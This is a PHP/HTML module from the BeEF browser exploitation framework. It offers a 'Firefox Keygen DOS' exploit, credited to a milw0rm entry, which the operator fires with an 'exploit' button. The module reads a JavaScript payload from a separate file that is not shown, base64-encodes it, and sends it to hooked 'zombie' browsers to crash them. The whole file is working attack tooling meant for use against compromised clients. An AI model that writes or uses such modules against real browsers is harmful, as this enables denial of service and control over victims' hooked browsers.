<?
	// Copyright (c) 2006-2009, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
?>

<!--

BeEF: this exploit was downloaded from milworm 
http://www.milw0rm.com/exploits/8822

-->

<script>
	var rtnval = "This shouldn't be returned'";

	Element.Methods.construct_code = function() {
		// javascript is loaded from a file - it could be hard coded
		var b64code = '<? echo get_b64_file(JS_FILE); ?>';
		// send the code to the zombies
		do_send(b64code);
	}

	// add construct code to DOM
	Element.addMethods();
</script>

<!-- PAGE CONTENT -->
<div id="module_header">exploit: Firefox Keygen DOS</div>
This will DOS firefox and give very limited interaction 
<div id="module_subsection">
	<form name="myform">
		<input class="button" type="button" value="exploit" onClick="javascript:construct_code()"/>
	</form>
</div>

